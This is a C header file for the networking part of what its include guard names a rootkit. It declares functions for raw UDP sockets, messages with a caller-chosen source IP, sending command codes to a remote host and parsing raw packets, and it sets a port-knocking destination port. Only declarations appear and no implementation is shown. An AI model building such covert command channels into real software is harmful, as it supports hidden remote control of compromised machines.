#ifndef ROOTKIT_NETWORKING_H
#define ROOTKIT_NETWORKING_H

#define KNOCK_DEST_PORT 30

#include <stdint.h>
#include <stdio.h>
#include "protocol.h"

int create_raw_udp_socket();
int bind_raw_socket(int socket_fd, char * ip_address);
void send_message(int socket_fd, const char * source_ip, const char * dest_ip, int port, const char * message);
void send_command(int socket_fd, const char * dest_ip, int port, enum command_codes command);

uint16_t parse_raw_packet(const char * buffer, ssize_t n);
char * get_local_interface_name();
char * get_local_address();

#endif //ROOTKIT_NETWORKING_H